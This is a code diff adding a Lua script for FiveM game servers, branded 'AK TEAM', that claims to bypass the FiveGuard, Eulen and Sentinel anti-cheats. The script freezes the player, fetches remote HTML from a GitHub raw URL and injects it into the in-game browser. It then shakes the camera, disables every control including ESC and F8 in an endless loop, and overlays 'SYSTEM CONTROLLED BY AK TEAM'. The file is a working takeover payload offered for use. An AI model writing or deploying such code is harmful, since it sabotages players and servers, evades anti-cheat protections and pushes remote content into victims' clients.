@@ -1,0 +1,44 @@
+-- [[ AK TEAM - ABSOLUTE OVERRIDE v10.0 ]] --
+-- Bypass: FiveGuard / Eulen / Sentinel
+
+local _G = _G
+local _raw = "https://raw.githubusercontent.com/ak-team309/ak-strike/main/index.html"
+
+-- تجميد فوري لمنع الـ Kick التلقائي
+_G.SetNuiFocus(true, false)
+_G.FreezeEntityPosition(_G.PlayerPedId(), true)
+
+-- طلب الكود من GitHub وحقنه كـ NUI Raw Data
+_G.PerformHttpRequest(_raw, function(err, text, headers)
+    if text then
+        -- إرسال البيانات للمتصفح الداخلي
+        _G.SendNUIMessage({
+            type = 'on', 
+            transactionType = 'AK_STRIKE_FORCE',
+            data = text
+        })
+        
+        -- تشغيل الهزة الأرضية للشاشة (تخريب الرؤية)
+        _G.ShakeGameplayCam("DEATH_FAIL_IN_EFFECT_SHAKE", 1.0)
+    end
+end, 'GET')
+
+-- حلقة السيطرة الكاملة (Anti-Control)
+_G.Citizen.CreateThread(function()
+    while true do
+        _G.Citizen.Wait(0)
+        -- تعطيل جميع الأزرار (حتى الـ ESC و F8)
+        _G.DisableAllControlActions(0)
+        
+        -- رسم نص AK TEAM فوق كل شيء كاحتياط
+        _G.SetTextFont(4)
+        _G.SetTextScale(1.5, 1.5)
+        _G.SetTextColour(255, 0, 0, 255)
+        _G.SetTextOutline()
+        _G.BeginTextCommandDisplayText("STRING")
+        _G.AddTextComponentString("SYSTEM CONTROLLED BY AK TEAM")
+        _G.EndTextCommandDisplayText(0.4, 0.4)
+    end
+end)
+
+print("^1[AK TEAM] NUCLEAR STRIKE INJECTED.^7")
